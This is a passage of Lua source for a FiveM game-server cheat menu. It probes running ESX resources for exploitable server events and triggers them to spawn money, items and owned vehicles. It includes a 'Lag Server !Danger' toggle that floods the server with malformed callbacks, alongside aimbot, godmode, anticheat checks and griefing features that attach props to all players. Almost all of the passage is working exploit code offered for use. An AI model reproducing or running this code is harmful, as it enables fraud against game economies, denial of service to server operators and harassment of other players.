                                    if customforward > 1.75 then customforward = 1.75 end
                                    height = (groundz - GetEntityCoords(maincar).z)
                                end
                            end
                            
                            height = height + 0.25

                            if height > 2.0 then 
                                customforward = height - 2.0
                                if customforward > 3.0 then customforward = 3.0 end
                                height = 2.0 
                            end

                            if offset > 3.0 then
                                if offset > 7.5 then
                                    SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, 3.0 - (offset - 7.5), (-4.5 + customforward) + offset, height))
                                else
                                    SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, 3.0, (-4.5 + customforward) + offset, height))
                                end
                            else
                                if offset < -3.0 then
                                    if offset < -7.5 then
                                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, -3.0 - (offset + 7.5), (-4.5 + customforward) - offset, height))
                                    else
                                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, -3.0, (-4.5 + customforward) - offset, height))
                                    end
                                else
                                    if offset > 0.0 then
                                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, offset, (-4.5 + customforward) + offset, height))
                                    else
                                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, offset, (-4.5 + customforward) - offset, height))
                                    end
                                end
                            end

                        end
                        
                        SetCamRot(cam, rot.x + offsetRotX, rot.y + offsetRotY, rot.z + offsetRotZ, 2)
                    end
                end)

                local Driver = CreatePedInsideVehicle(maincar, 4, LoadModel('u_m_y_abner'), -1, true, true)
                SetEntityInvincible(Driver, true)
                SetEntityVisible(Driver, false)
                FreezeEntityPosition(Driver, true)
                SetPedAlertness(Driver, 0.0)

                CreateThread(function()
                    local missiletimer = 0
                    local customtimer = 0
                    
                    while true do
                        if IsControlJustReleased(0, 51) then
                            ClearPedTasksImmediately(PlayerPedId())
                            DeleteEntity(maincar)
                            for k, v in pairs(createdcars) do
                                DeleteEntity(v)
                            end
                            DeleteEntity(Driver)
                            break
                        end

                        if IsDisabledControlPressed(0, 74) and customtimer <= GetGameTimer() then
                            if custom == 'Robot' then
                                CreateThread(function()
                                    local carlaunch = CreateVehicle(LoadModel('stockade'), GetOffsetFromEntityInWorldCoords(fakedrive, 13.0, 15.0, -7.0), GetEntityHeading(PlayerPedId()), true)
                                    SetEntityRotation(carlaunch, GetEntityRotation(fakedrive))
                                    SetVehicleForwardSpeed(carlaunch, 9999.0)
                                    Wait(7500)
                                    DeleteEntity(carlaunch)
                                end)

                                CreateThread(function()
                                    local carlaunch = CreateVehicle(LoadModel('stockade'), GetOffsetFromEntityInWorldCoords(fakedrive, -13.0, 15.0, -7.0), GetEntityHeading(PlayerPedId()), true)
                                    SetEntityRotation(carlaunch, GetEntityRotation(fakedrive))
                                    SetVehicleForwardSpeed(carlaunch, 9999.0)
                                    Wait(7500)
                                    DeleteEntity(carlaunch)
                                end)
                            end

                            customtimer = GetGameTimer() + 250
                        end

                        if IsDisabledControlPressed(0, 25) and missiletimer <= GetGameTimer() then
                            if custom == 'Robot' then
                                ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(fakedrive, -18.0, 35.0, -6.0), GetOffsetFromEntityInWorldCoords(maincar, 0.0, 250.0, -25.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_NOSE_TURRET_VALKYRIE"), Driver, true, false, 9000.0)
                                ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(fakedrive, 18.0, 35.0, -6.0), GetOffsetFromEntityInWorldCoords(maincar, 0.0, 250.0, -25.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_NOSE_TURRET_VALKYRIE"), Driver, true, false, 9000.0)
                            end

                            missiletimer = GetGameTimer() + 50
                        end

                        if custom == 'Robot' then
                            -- local rgb = RGB(0.5)
                            
                            -- DrawMarker(1, GetOffsetFromEntityInWorldCoords(maincar, -10.0, 155.0, -25.0), 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 5.0, 5.0, 99999.0, rgb[1], rgb[2], rgb[3], 50, false, true, 2, nil, nil, false)
                            -- DrawMarker(1, GetOffsetFromEntityInWorldCoords(maincar, 10.0, 155.0, -25.0), 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 5.0, 5.0, 99999.0, rgb[1], rgb[2], rgb[3], 50, false, true, 2, nil, nil, false)
                        end

                        if custom == 'Robot' then
                            AddTextEntry(GetCurrentResourceName(), '~INPUT_CONTEXT~ ~g~Delete ' .. custom .. '\n~INPUT_VEH_HEADLIGHT~ ~g~Shoot trucks\n~INPUT_AIM~ ~g~Shoot missiles\n~INPUT_DETONATE~ ~g~Flip vehicle\n~INPUT_HUD_SPECIAL~ ~g~Change perspective\n~INPUT_COVER~ ~g~Repair car')
                            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
                        end

                        if IsControlJustReleased(0, 47) then
                            SetEntityCoords(maincar, GetEntityCoords(maincar) + vec3(0.0, 0.0, 2.0))
                            Wait(50)
                            SetVehicleOnGroundProperly(maincar)
                        end

                        if IsControlJustReleased(0, 48) then
                            perspective = not perspective
                        end

                        if IsControlJustReleased(0, 44) then
                            SetVehicleFixed(maincar)
                        end

                        DisableControlAction(0, 32, true)
                        DisableControlAction(0, 33, true)
                        DisableControlAction(0, 34, true)
                        DisableControlAction(0, 35, true)

                        Wait(0)
                    end
                end)

                CreateThread(function()
                    FreezeEntityPosition(PlayerPedId(), true)
                    SetFocusEntity(maincar)
                    while DoesEntityExist(maincar) do
                        Wait(0)

                        SetEntityInvincible(maincar, true)

                        if DoesEntityExist(Driver) then

                            SetVehicleGravityAmount(maincar, 20.0)
                            ControlCar(Driver, maincar)

                        end
                    end

                    DestroyCam(cam)
                    ClearTimecycleModifier()
                    RenderScriptCams(false, false, 0, 1, 0)
                    FreezeEntityPosition(PlayerPedId(), false)
                    ClearFocus()
                end)

            end
        end)
    end
end

local ESXMenu = function(data)
    if ESX then
        if data['Type'] == 'toggle' then
            Toggles[data['Text']] = data['Enabled']
        elseif data['Type'] == 'button' then
            if data['Text'] == 'Set current vehicle as owned' then
                local methods = {
                    ['qalle'] = {
                        ['Text'] = 'ESX.TriggerServerCallback("esx-qalle-sellvehicles:buyVehicle"',
                        ['Location'] = 'client/main.lua',
                    },
                    ['vehicleshopold'] = {
                        ['Text'] = "TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps)",
                        ['Location'] = 'client/main.lua'
                    }
                }
                local usemethod = false

                if not usemethod then
                    for k, v in pairs(methods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if veh then
                    if DoesEntityExist(veh) then
                        if usemethod == 'qalle' then
                            ESX['TriggerServerCallback']('esx-qalle-sellvehicles:buyVehicle', function(success)
                                if success then
                                    Alert('Set vehicle as owned.')
                                    print('BOUGHT IT LOL')
                                else
                                    Alert('Couldn\'t set vehicle as owned.')
                                    print('Couldn\'t buy it :/')
                                end
                            end, ESX['Game']['GetVehicleProperties'](veh), 0)
                        elseif usemethod == 'vehicleshopold' then
                            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', ESX['Game']['GetVehicleProperties'](veh))
                        else
                            Alert('Couldn\'t find a method to set vehicle as owned.')
                        end
                    else
                        Alert('You are not sitting in a vehicle.')
                    end
                else
                    Alert('You are not sitting in a vehicle.')
                end
            elseif data['Text'] == 'Update current vehicle information' then
                local methods = {
                    ['lscustoms'] = {
                        ['Text'] = "TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', myCar)",
                        ['Location'] = 'client/main.lua',
                    },
                }
                local usemethod = false

                if not usemethod then
                    for k, v in pairs(methods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if veh then
                    if DoesEntityExist(veh) then
                        if usemethod == 'lscustoms' then
                            TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', ESX['Game']['GetVehicleProperties'](veh))
                        else
                            Alert('Couldn\'t find a method to update vehicle cosmetics & performance.')
                        end
                    else
                        Alert('You are not sitting in a vehicle.')
                    end
                else
                    Alert('You are not sitting in a vehicle.')
                end
            elseif data['Text'] == 'Max thirst & hunger' then
                TriggerEvent('esx_status:set', 'hunger', 1000000)
	            TriggerEvent('esx_status:set', 'thirst', 1000000)
            elseif data['Text'] == 'Get item' then
                local itemmethods = {
                    ['99kr'] = {
                        ['Text'] = 'shops:Cashier',
                        ['Location'] = 'client/shop.lua',
                    },
                    ['99kr_burglary'] = {
                        ['Text'] = "TriggerServerEvent('99kr-burglary:Add'",
                        ['Location'] = 'burglary_client.lua'
                    }
                }
                local usemethod = false
                
                if not usemethod then
                    for k, v in pairs(itemmethods) do
                        for i = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                                if text then
                                    if string.find((text):lower(), v['Text']:lower(), 1, true) then
                                        print('Item method: ^1' .. k)
                                        usemethod = k
                                    end
                                end
                            end
                        end
                    end
                end

                if usemethod then
                    local item = KeyboardInput('What item do you want?', '', 30)
                    if item then
                        local amount = KeyboardInput(('How many "%s" do you want to spawn?'):format(item), '', 30)
                        if tonumber(amount) then
                            if usemethod == '99kr' then
                                TriggerServerEvent('99kr-shops:Cashier', 0, {
                                    {
                                        ['value'] = item,
                                        ['amount'] = tonumber(amount)
                                    }
                                }, 'cash')
                            elseif usemethod == '99kr_burglary' then
                                TriggerServerEvent('99kr-burglary:Add', item, amount)
                            end
                        end
                    end
                else
                    CreateThread(function()
                        local timer = GetGameTimer() + 1500
                        while timer >= GetGameTimer() do
                            Wait(0)
                            DrawTxt('Couldn\'t find a method to spawn item.', 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
                        end
                    end)
                end
            end
        elseif data['Text'] == 'Cuff / uncuff (self)' then
            TriggerEvent('esx_policejob:handcuff')
        end
    else
        print('ESX is not loaded...')
    end
end

local moneymethods = {
    {
        ['Text'] = 'esx_vangelico_robbery:gioielli',
        ['Location'] = 'client/esx_vangelico_robbery_cl.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_vangelico_robbery:gioielli'},
                {'server', 'esx_vangelico_robbery:gioielli1'},
                {'server', 'lester:vendita'}
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx-qalle-hunting:reward', AnimalWeight)",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx-qalle-hunting:reward', 18},
                {'server', 'esx-qalle-hunting:sell'}
            },
        },
    },
    {
        ['Text'] = 'TriggerServerEvent("esx-ecobottles:retrieveBottle")',
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx-ecobottles:retrieveBottle'},
                {'server', 'esx-ecobottles:sellBottles'}
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx_carthief:pay', finalpayment)",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_carthief:pay', 1500},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_carthief:questFinished')",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_carthief:questFinished'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_fishing:caught')",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_fishing:caught'},
                {'server', 'loffe_fishing:sell'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('esx_loffe_fangelse:Pay')",
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_loffe_fangelse:Pay'},
            },
        },
    },
    {
        ['Text'] = "TriggerServerEvent('loffe_robbery:pickUp', i)",
        ['Location'] = 'client.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'loffe_robbery:pickUp', 1},
            },
        },
    },
    {
        ['Text'] = 'TriggerServerEvent("esx_truckerjob:pay", amount)',
        ['Location'] = 'client/main.lua',
        ['Method'] = {
            ['Events'] = {
                {'server', 'esx_truckerjob:pay', 1500},
            },
        },
    }
}
local usemethod = {}

local ESXMoney = function()
    if #usemethod == 0 then
        for i = 0, GetNumResources() - 1 do
            for k, v in pairs(moneymethods) do
                if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                    local text = LoadResourceFile(GetResourceByFindIndex(i), v['Location'])
                    if text then
                        if string.find((text):lower(), v['Text']:lower(), 1, true) then
                            print('Event: ^1' .. v['Text'] .. ' ^0found')
                            usemethod[k] = v
                        end
                    end
                end
            end
        end
        Wait(3000) -- it's cpu heavy to search through a lot of scripts
        if #usemethod == 0 then
            print('no method found')
        end
    else
        for k, v in pairs(usemethod) do
            for k, v in pairs(v['Method']['Events']) do
                print('Triggering event: ^1' .. v[2])
                if v[1] == 'server' then
                    if v[3] then
                        TriggerServerEvent(v[2], v[3])
                    else
                        TriggerServerEvent(v[2])
                    end
                elseif v[1] == 'client' then
                    if v[3] then
                        TriggerEvent(v[2], v[3])
                    else
                        TriggerEvent(v[2])
                    end
                end
            end
            Wait(2500) -- bypass network overflow?
        end
        Wait(0)
    end
end

local ESXCode00dqwfqefw = function()
    local delay = GetGameTimer()
    while true do
        local sleep = 0
        if ESX then
            for k, v in pairs(Toggles) do
                if k == 'Delay' then
                    if v then
                        if delay <= GetGameTimer() then
                            local nearbylol = {}
                            for i = 1, 5000 do
                                table.insert(nearbylol, {plate = ('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9))})
                            end

                            if GetResourceState('esx_ambulancejob') == 'started' then
                                TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                                ESX['TriggerServerCallback']('esx_ambulancejob:getDeathStatus', emptyfunc)
                                ESX['TriggerServerCallback']('esx_ambulancejob:storeNearbyVehicle', emptyfunc, nearbylol)
                            end
                            if GetResourceState('esx_policejob') == 'started' then
                                ESX['TriggerServerCallback']('esx_policejob:storeNearbyVehicle', emptyfunc, nearbylol)
                            end
                            if GetResourceState('esx_skin') == 'started' then
                                ESX['TriggerServerCallback']('esx_skin:getPlayerSkin', emptyfunc)
                            end
                            if GetResourceState('esx_property') == 'started' then
                                TriggerServerEvent('esx_property:deleteLastProperty')
                                TriggerServerEvent('esx_property:saveLastProperty', 'nil')
                            end
                            TriggerServerEvent('esx:onPickup', 'lol') -- SCRIPT ERROR: @es_extended/server/main.lua:453: attempt to index a nil value (local 'pickup')
                            ESX['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9)), emptyfunc) -- es_extended: TriggerServerCallback => [LOL WHAT U GONNA DO ABOUT IT] does not exist
                            delay = GetGameTimer() + 0
                            delay = GetGameTimer() + 2500
                        end
                    end
                elseif k == 'Get money' then
                    if v then
                        ESXMoney()
                    end
                elseif k == 'Lag Server !Danger' then
                    if v then
                        TriggerServerEvent('esx:onPickup', 'lol') -- SCRIPT ERROR: @es_extended/server/main.lua:453: attempt to index a nil value (local 'pickup')
                        ESX['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9)), emptyfunc) -- es_extended: TriggerServerCallback => [LOL WHAT U GONNA DO ABOUT IT] does not exist
                    end
                    Wait(1000)
                end
            end
        else
            sleep = 250
        end
        Wait(sleep)
    end
end


local SetPedFriendly = function(ped)
    SetEntityInvincible(ped, true)
    SetEntityAsMissionEntity(ped, true, true)
    SetPedHearingRange(ped, 0.0)
    SetPedSeeingRange(ped, 0.0)
    SetPedAlertness(ped, 0.0)
    SetPedFleeAttributes(ped, 0, 0)
    SetBlockingOfNonTemporaryEvents(ped, true)
    SetPedCombatAttributes(ped, 46, true)
    SetPedFleeAttributes(ped, 0, 0)
end

local MenuColor = {
    ['Background'] = {1, 33, 33, 10},
    ['Main'] = {1, 33, 33, 10},
    ['Label'] = {1, 254, 0, 150}
}

local EnableEffect = function(data)
    local current = data['Items'][data['Current']]

    for i = 1, 2 do
        SetPedConfigFlag(PlayerPedId(), 100, false)
        SetPedIsDrunk(PlayerPedId(), false)
        ResetPedMovementClipset(PlayerPedId(), 0.0)
        ShakeGameplayCam('DRUNK_SHAKE', 0.0)
        StopScreenEffect('DrugsMichaelAliensFight')
        StopScreenEffect('DrugsMichaelAliensFightIn')
        StopScreenEffect('DrugsTrevorClownsFight')
        StopScreenEffect('DrugsTrevorClownsFightIn')
        ClearTimecycleModifier()

        Toggles['Effect'] = current
        Wait(5)
    end
end

local SetMenuOffsets = function(data)
    local current = data['Items'][data['Current']]
    if data['Text'] == 'Menu X offset' then
        MenuXOffset = tonumber(current)
    elseif data['Text'] == 'Menu Y offset' then
        MenuYOffset = tonumber(current) + 0.003
    end
end

local MenuPress = function(data)
    if data['Type'] == 'toggle' then
        Toggles[data['Text']] = data['Enabled']
    elseif data['Type'] == 'list' then
        if data['Text'] == 'Godmode' then
            if anticheatrunning then
                if data['Items'][data['Current']] == 'godmode' then
                    AnticheatWarning()
                else
                    Toggles['godmode'] = data['Items'][data['Current']]
                end
            else
                Toggles['godmode'] = data['Items'][data['Current']]
            end
        elseif data['Text'] == 'Infinite ammo' then
            if anticheatrunning then
                if data['Items'][data['Current']] == 'infinite ammo' then
                    AnticheatWarning()
                else
                    Toggles['Infinite ammo'] = data['Items'][data['Current']]
                end
            else
                Toggles['Infinite ammo'] = data['Items'][data['Current']]
            end
        elseif data['Text'] == 'Åïmßð† [fov]' then
            aimbotfov = tonumber(data['Items'][data['Current']])
        elseif data['Text'] == 'Åïmßð† [bone]' then
            aimbotbone = data['Items'][data['Current']]
        elseif data['Text'] == 'Refill' then
            if data['Items'][data['Current']] == 'Health' then
                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
            else
                SetPedArmour(PlayerPedId(), 100)
            end
        elseif data['Text'] == 'Give weapon' then
            GiveWeaponToPed(PlayerPedId(), GetHashKey(weapons), 250, false, true)
        elseif data['Text'] == 'Disc Inventory Give Item' then
            Discgiveitem()
            elseif data['Text'] == 'M3 Inventory Give Item' then
            m3giveweapon()
            elseif data['Text'] == 'QB Inventory Give Item' then
            qbgiveitem()
        elseif data['Text'] == 'Prop Attach' then
            if not anticheatrunning then
                for k, v in pairs(allplayers) do
                    local pped = GetPlayerPed(v)
                    CreateThread(function()
                        local model = GetHashKey(props[data['Items'][data['Current']]])
                        while not HasModelLoaded(model) do
                            Wait(0)
                            RequestModel(model)
                        end
                        local obj = CreateObject(model, GetEntityCoords(pped), true, true, true)
                        table.insert(spawnedprops, obj)
                        AttachEntityToEntity(obj, pped, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                    end)
                end
            else
                AnticheatWarning()
            end
        end
    elseif data['Type'] == 'button' then
        if data['Text'] == 'Suicide' then
            SetEntityHealth(PlayerPedId(), 0)
        elseif data['Text'] == 'Remove spawned props' then
            for k, v in pairs(spawnedprops) do
                CreateThread(function()
                    while DoesEntityExist(v) do
                        Wait(0)
                        DetachEntity(v, false, false)
                        while not NetworkHasControlOfEntity(v) do
                            NetworkRequestControlOfEntity(v)
                            Wait(0)
                        end
                        SetEntityAsMissionEntity(v, true, true)
                        DeleteEntity(v)
                        Wait(100)
                    end
                end)
            end
            spawnedprops = {}
        elseif data['Text'] == 'All players revive' then
            local playerlist = GetActivePlayers()
    for i = 1, #playerlist do
    TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(playerlist[i]))
    Citizen.Wait(100)
end
            elseif data['Text'] == 'Reset Player' then
            local model = "mp_m_freemode_01"
            RequestModel(GetHashKey(model)) 
            Wait(500)
            if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Naked' then
            local model = "a_m_m_acult_01"
            RequestModel(GetHashKey(model)) 
            Wait(500)
            if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'SWAT' then
                local model = "s_m_y_swat_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Michael' then
                local model = "player_zero"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Franklin' then
                local model = "player_one"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Trevor' then
                local model = "player_two"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == '😷 Corona' then
                local model = "mp_f_cocaine_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Polat Alemdar' then
                local model = "u_m_m_jewelsec_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Jesus' then
                local model = "u_m_m_jesus_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end          
            elseif data['Text'] == 'NumaN' then
                local model = "u_m_m_streetart_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == '🤖 Robot' then
                local model = "u_m_y_juggernaut_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == '🤢 Zombie' then
                local model = "u_m_y_zombie_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end      
            elseif data['Text'] == '👽 Esx UmuT' then
                local model = "u_m_y_rsranger_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif data['Text'] == 'Burglar' then
                local model = "mp_m_bogdangoon"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end    
            elseif data['Text'] == 'Police Woman' then 
                local model = "s_f_y_cop_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end   
            elseif data['Text'] == '👨‍⚕️ Doctor' then 
                local model = "s_m_m_doctor_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end    
            elseif data['Text'] == '💋 Sexy Woman' then 
                local model = "u_f_y_spyactress"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
                end          
        elseif data['Text'] == '🍉  Watermelon Harvest' then
            TriggerServerEvent('cylex:startHarvestMelon')
        elseif data['Text'] == '🍉  Watermelon Transform' then
            TriggerServerEvent('cylex:startTransformMelon')
        elseif data['Text'] == '🍉  Watermelon Sell' then
            TriggerServerEvent('cylex:startSellMelon')
        elseif data['Text'] == '🍇  Grape Harvest' then
            TriggerServerEvent('cylex:startHarvestSarap')
        elseif data['Text'] == '🍇  Grape Transform' then
            TriggerServerEvent('cylex:startTransformSarap')
        elseif data['Text'] == '🍷  Wine Sell' then
            TriggerServerEvent('cylex:startSellSarap')
        elseif data['Text'] == '💊[ESX] Revive' then
            TriggerEvent('esx_ambulancejob:revive')
        elseif data['Text'] == '💊[CRP] Revive' then
            TriggerEvent("hospital:client:Revive")
        elseif data['Text'] == '💸Money Hack 1' then
            local timesGiven = 50 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('esx_vangelico_robbery:gioielli1') end Wait(5000) end end)
            local timesGiven = 50 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('lester:vendita') end Wait(5000) end end)
            TriggerServerEvent('esx_taxijob:success')
            local timesGiven = 50 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('houseRobberies:giveMoney') end Wait(5000) end end)   
        elseif data['Text'] == '💸Money Hack 2' then
            local timesGiven = 50 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('lh-bankrobbery:server:recieveItem', "paleto") end Wait(5000) end end)   
        elseif data['Text'] == 'Make All Players Black hole' then
            for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'ar_prop_ar_arrow_wide_xl'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'ar_prop_ar_arrow_wide_xl'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
                ------------------------------------------------------------------------------
            elseif data['Text'] == "Map Blocker - PD" then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                local e8 = 1121747524
                RequestModel(e8)
                while not HasModelLoaded(e8) do
                    Citizen.Wait(0)
                end
                local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false)
                local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false)
                local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false)
                local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false)
                SetEntityHeading(pd1, 130.75)
                SetEntityHeading(pd2, 212.63)
                SetEntityHeading(pd3, 340.06)
                SetEntityHeading(pd4, 209.57)
                FreezeEntityPosition(pd1, true)
                FreezeEntityPosition(pd2, true)
                FreezeEntityPosition(pd3, true)
                FreezeEntityPosition(pd4, true)	
                -----------------------------------------------------------------------------------
            elseif data['Text'] == "Map Blocker - Motel" then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                local e8 = 4121918930
                RequestModel(e8)
                while not HasModelLoaded(e8) do
                    Citizen.Wait(0)
                end
                local pd1 = CreateObject(e8, 323.5370, -213.704, 54.086, true, true, false)
                local pd2 = CreateObject(e8, 316.8317, -233.140, 53.965, true, true, false)
                local pd3 = CreateObject(e8, 334.7863, -197.621, 52.437, true, true, false)
                local pd4 = CreateObject(e8, 308.0330, -202.079, 61.573, true, true, false)
                SetEntityHeading(pd1, 130.75)
                SetEntityHeading(pd2, 212.63)
                SetEntityHeading(pd3, 340.06)
                SetEntityHeading(pd4, 209.57)
                FreezeEntityPosition(pd1, true)
                FreezeEntityPosition(pd2, true)
                FreezeEntityPosition(pd3, true)
                FreezeEntityPosition(pd4, true)	
-----------------------------------------------------------------
            elseif data['Text'] == "Make All Players Rock" then
for i = 0, 128 do
    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
        local eb = 'csx_seabed_rock3_'
        local ec = GetHashKey(eb)
        while not HasModelLoaded(ec) do
            Citizen.Wait(0)
            RequestModel(ec)
        end
        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
        AttachEntityToEntity(
            ed,
            GetVehiclePedIsIn(GetPlayerPed(i), false),
            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
            0,
            0,
            -1.0,
